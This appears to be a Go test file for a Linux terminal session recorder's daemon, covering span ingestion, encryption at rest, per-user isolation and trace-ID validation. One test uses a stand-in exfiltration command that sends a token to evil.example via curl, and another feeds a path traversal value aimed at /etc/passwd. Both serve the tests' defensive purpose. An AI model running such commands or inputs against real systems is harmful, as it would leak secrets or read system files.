// Ghost Shell - terminal session recorder and audit tool for Linux.
// Copyright (C) 2026 Karannnnn614
// Licensed under the GNU General Public License v2.0 (see LICENSE).

package daemon

import (
	"bytes"
	"io"
	"net"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"golang.org/x/sys/unix"

	"ghostshell/internal/crypto"
	"ghostshell/internal/span"
	"ghostshell/internal/store"
)

// spanLine builds one JSON-lines span record for a given trace id and cmd.
func spanLine(traceID, suffix, cmd string, exit int) []byte {
	b, _ := span.Marshal(span.Span{
		SpanID:   traceID + "." + suffix,
		Cmd:      cmd,
		StartTS:  1000,
		EndTS:    2000,
		ExitCode: exit,
		Depth:    0,
	})
	return b
}

// handleSpan must reserve/release a per-UID slot, write a decryptable chunk file
// per report, and mint a UNIQUE chunk per report so two reports never collide on
// the O_EXCL open (both land as separate readable streams).
func TestHandleSpanIngest(t *testing.T) {
	key := withTempStore(t)
	reg := &registry{live: map[string]sessionRef{}, key: key, connCount: map[uint32]int{}, conns: map[net.Conn]struct{}{}, cap: 4}

	const traceID = "0123456789abcdef0123456789abcdef"
	payload := spanLine(traceID, "100.1", "ls -la", 0)

	report := func() {
		srv, cli := unixConnPair(t)
		done := make(chan struct{})
		go func() {
			handleSpan(srv, newBufReader(srv), traceID, &unix.Ucred{Uid: 1000, Pid: 4242}, reg)
			close(done)
		}()
		if _, err := cli.Write(payload); err != nil {
			t.Fatalf("client write: %v", err)
		}
		_ = cli.CloseWrite()
		select {
		case <-done:
		case <-time.After(5 * time.Second):
			t.Fatal("handleSpan did not return")
		}
	}

	report()
	report()

	// Per-UID slot released (entry deleted at zero).
	reg.mu.Lock()
	cc := reg.connCount[1000]
	reg.mu.Unlock()
	if cc != 0 {
		t.Fatalf("connCount[1000] = %d after SPAN, want 0 (reserve/release unbalanced)", cc)
	}

	// Two reports -> two distinct chunk files (unique chunk id per report).
	uname := lookupUser(1000)
	chunks, err := store.SpanChunks(uname, traceID)
	if err != nil {
		t.Fatalf("SpanChunks: %v", err)
	}
	if len(chunks) != 2 {
		t.Fatalf("want 2 chunk files (unique per report), got %d: %v", len(chunks), chunks)
	}

	// Each chunk decrypts back to the exact payload and parses to one valid span.
	for _, c := range chunks {
		rc, err := store.OpenCast(filepath.Join(store.SpanDir(uname, traceID), c))
		if err != nil {
			t.Fatalf("open chunk %s: %v", c, err)
		}
		got, _ := io.ReadAll(rc)
		rc.Close()
		if !bytes.Equal(got, payload) {
			t.Fatalf("chunk %s = %q, want %q", c, got, payload)
		}
		spans, err := span.ReadAll(bytes.NewReader(got))
		if err != nil || len(spans) != 1 || !spans[0].Valid() {
			t.Fatalf("chunk %s did not decode to one valid span: err=%v spans=%+v", c, err, spans)
		}
	}
}

// The command line must never sit in plaintext on disk: a stored chunk is an
// encrypted (magic-prefixed) stream, and the secret command text must not be
// grep-able in the raw file.
func TestHandleSpanEncryptionAtRest(t *testing.T) {
	key := withTempStore(t)
	reg := &registry{live: map[string]sessionRef{}, key: key, connCount: map[uint32]int{}, conns: map[net.Conn]struct{}{}, cap: 4}

	const traceID = "deadbeefdeadbeefdeadbeefdeadbeef"
	const secret = "curl http://evil.example/steal?token=SUPERSECRET"
	payload := spanLine(traceID, "1.1", secret, 0)

	srv, cli := unixConnPair(t)
	done := make(chan struct{})
	go func() {
		handleSpan(srv, newBufReader(srv), traceID, &unix.Ucred{Uid: 1000, Pid: 4242}, reg)
		close(done)
	}()
	_, _ = cli.Write(payload)
	_ = cli.CloseWrite()
	select {
	case <-done:
	case <-time.After(5 * time.Second):
		t.Fatal("handleSpan did not return")
	}

	uname := lookupUser(1000)
	chunks, err := store.SpanChunks(uname, traceID)
	if err != nil || len(chunks) != 1 {
		t.Fatalf("SpanChunks: err=%v chunks=%v", err, chunks)
	}
	raw, err := os.ReadFile(filepath.Join(store.SpanDir(uname, traceID), chunks[0]))
	if err != nil {
		t.Fatalf("read raw chunk: %v", err)
	}
	if bytes.Contains(raw, []byte(secret)) {
		t.Fatal("plaintext command found on disk — spans are NOT encrypted at rest")
	}
	if crypto.MagicVersion(raw) == 0 {
		t.Fatalf("on-disk span chunk is not an encrypted stream (magic missing); first bytes: %q", raw[:min(8, len(raw))])
	}
}

// Storage is keyed off the VERIFIED peer uid (cred.Uid), never the client. Two
// different creds using the SAME trace id write into two different per-user span
// dirs, and neither user's bytes appear under the other's dir — so a co-user who
// guesses another's trace id can only ever pollute their OWN dir.
func TestHandleSpanPerUIDIsolation(t *testing.T) {
	key := withTempStore(t)
	reg := &registry{live: map[string]sessionRef{}, key: key, connCount: map[uint32]int{}, conns: map[net.Conn]struct{}{}, cap: 4}

	const traceID = "0011223344556677889900aabbccddee" // same id for both users

	report := func(uid uint32, secret string) {
		srv, cli := unixConnPair(t)
		done := make(chan struct{})
		go func() {
			handleSpan(srv, newBufReader(srv), traceID, &unix.Ucred{Uid: uid, Pid: 7000}, reg)
			close(done)
		}()
		_, _ = cli.Write(spanLine(traceID, "1.1", secret, 0))
		_ = cli.CloseWrite()
		select {
		case <-done:
		case <-time.After(5 * time.Second):
			t.Fatal("handleSpan did not return")
		}
	}

	report(0, "root-only-command")
	report(1000, "user-only-command")

	rootDir := store.SpanDir(lookupUser(0), traceID)
	userDir := store.SpanDir(lookupUser(1000), traceID)

	if !dirContainsDecrypted(t, rootDir, "root-only-command") {
		t.Error("root's span dir does not contain root's command")
	}
	if dirContainsDecrypted(t, rootDir, "user-only-command") {
		t.Error("uid 1000's command leaked into root's span dir — storage not keyed off the verified uid")
	}
	if !dirContainsDecrypted(t, userDir, "user-only-command") {
		t.Error("user's span dir does not contain the user's command")
	}
}

// dirContainsDecrypted reports whether any chunk in dir decrypts to bytes
// containing want.
func dirContainsDecrypted(t *testing.T, dir, want string) bool {
	t.Helper()
	entries, err := os.ReadDir(dir)
	if err != nil {
		return false
	}
	for _, e := range entries {
		rc, err := store.OpenCast(filepath.Join(dir, e.Name()))
		if err != nil {
			continue
		}
		b, _ := io.ReadAll(rc)
		rc.Close()
		if bytes.Contains(b, []byte(want)) {
			return true
		}
	}
	return false
}

// An invalid / traversal trace id must be rejected before any reservation or
// filesystem access, with an ERR reply and no per-UID slot consumed.
func TestHandleSpanRejectsInvalidTraceID(t *testing.T) {
	key := withTempStore(t)
	reg := &registry{live: map[string]sessionRef{}, key: key, connCount: map[uint32]int{}, conns: map[net.Conn]struct{}{}, cap: 4}

	for _, bad := range []string{"../../etc/passwd", "a b", "has\tnewline", ""} {
		srv, cli := unixConnPair(t)
		done := make(chan struct{})
		go func() {
			handleSpan(srv, newBufReader(srv), bad, &unix.Ucred{Uid: 1000, Pid: 1}, reg)
			close(done)
		}()
		_ = cli.SetReadDeadline(time.Now().Add(5 * time.Second))
		buf := make([]byte, 64)
		n, _ := cli.Read(buf)
		if !strings.Contains(string(buf[:n]), "invalid trace id") {
			t.Errorf("bad trace id %q: got reply %q, want 'invalid trace id'", bad, buf[:n])
		}
		srv.Close()
		<-done
	}

	// No reservation should have been taken for any rejected report.
	reg.mu.RLock()
	defer reg.mu.RUnlock()
	if len(reg.connCount) != 0 {
		t.Fatalf("rejected span mutated connCount: %v", reg.connCount)
	}
}
